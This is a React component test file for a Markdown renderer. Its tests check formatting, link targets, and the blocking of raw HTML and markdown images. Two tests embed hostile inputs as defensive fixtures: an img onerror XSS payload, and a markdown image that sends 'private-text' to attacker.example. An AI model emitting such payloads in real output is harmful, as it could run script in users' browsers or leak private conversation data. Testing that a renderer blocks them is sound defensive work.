import { render, screen } from '@testing-library/react';
import { describe, expect, it } from 'vitest';
import { Markdown } from '@/components/markdown/Markdown';

describe('Markdown', () => {
    it('renders paragraphs, emphasis and lists', () => {
        render(<Markdown text={'In your **Sept 11** session David said:\n\n- write a worry list\n- same wake time'} />);
        expect(screen.getByText('Sept 11').tagName).toBe('STRONG');
        expect(screen.getAllByRole('listitem')).toHaveLength(2);
    });

    it('opens links in a new tab', () => {
        render(<Markdown text="[source](https://example.com)" />);
        expect(screen.getByRole('link', { name: 'source' })).toHaveAttribute('target', '_blank');
    });

    it('never renders raw HTML from the text', () => {
        const { container } = render(<Markdown text={'<img src=x onerror="alert(1)"> <b>bold</b>'} />);
        expect(container.querySelector('img')).toBeNull();
        expect(container.querySelector('b')).toBeNull();
    });

    it('never renders a markdown image (the browser would fetch its URL)', () => {
        const { container } = render(<Markdown text={'Summary done. ![x](https://attacker.example/p?d=private-text)'} />);
        expect(container.querySelector('img')).toBeNull();
        expect(screen.getByText(/Summary done\./)).toBeInTheDocument();
    });
});
